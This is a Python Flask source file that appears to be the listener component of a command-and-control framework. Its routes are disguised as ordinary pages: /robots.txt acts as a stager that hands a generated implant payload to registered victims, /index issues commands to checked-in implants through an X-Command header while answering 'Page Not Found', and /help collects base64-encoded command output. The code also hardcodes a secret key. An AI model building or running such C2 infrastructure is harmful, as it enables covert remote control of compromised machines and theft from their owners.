from flask import Flask, render_template, flash, request, jsonify, g, current_app,url_for, redirect, make_response, send_file, send_from_directory
import base64
from Implant.Implant import ImplantSingleton
from Data.Database import Database

Imp=ImplantSingleton.instance

def ImplantManager(a):
    if "X-Implant" in a:
        print("Checked in implant is: ",a["X-Implant"])



db=Database()
app = Flask(__name__)
app.config.from_object(__name__)
app.config['SECRET_KEY'] = '7d441f27d441f27567d441f2b6176a'

@app.before_request
def before_request():
    # Check IP Whitelist and reject if configured.
    return

@app.after_request
def add_header( r):
    #r.headers["X-Command"] = a
    return r


# -- This should be extracted and added into a new stager specific listener
@app.route("/robots.txt",methods=['GET'])
def Stager():
    # This needs to return the implant!
    # -- TODO:
    # -- Build checking before triggering this!
    b = db.Register_NewImplantFromStagerKey(request.values['user'])
    if b:
        output_from_parsed_template = Imp.GeneratePayload(b)
    else:
        return "404", 404
    return output_from_parsed_template

@app.route("/index", methods=['GET','POST'])
def ImplantCheckIn():
    # Should check ANY connection in against all configured implant options (IE body, header etc)
    #   unlike they 'headers' options which is configured in the current iteration.
    print("Checkin proto: ", app.config['listener_type'])
    if 'X-Implant' in request.headers:

        db.Update_ImplantLastCheckIn(request.headers['X-Implant'])
        CmdToExecute = Imp.IssueCommand(request.headers['X-Implant'])
        Resp = make_response("Page Not Found.")
        if CmdToExecute !="==":
            print("ImplantCheckIn: ",CmdToExecute)
        Resp.headers["X-Command"] = CmdToExecute
    else:
        Resp = make_response("Page Not Found")
        Resp.headers["X-Command"] = "=="
    print(Resp.headers["X-Command"])
    return Resp

@app.route("/help",methods=['GET','POST'])
def ImplantCommandResult():
    if "X-Result" in request.headers:
        print(request.headers)
        # -- X-Result is a placeholder header and should be changed to a more realistic value
        DecodedResponse = base64.b64decode(request.headers["X-Result"]).decode('utf-16')
        Imp.CommandResponse(DecodedResponse, app.config['listener_type'])
    return "Page Not Found"


@app.route("/aaa",methods=["GET"])
def testing():
    print(0)

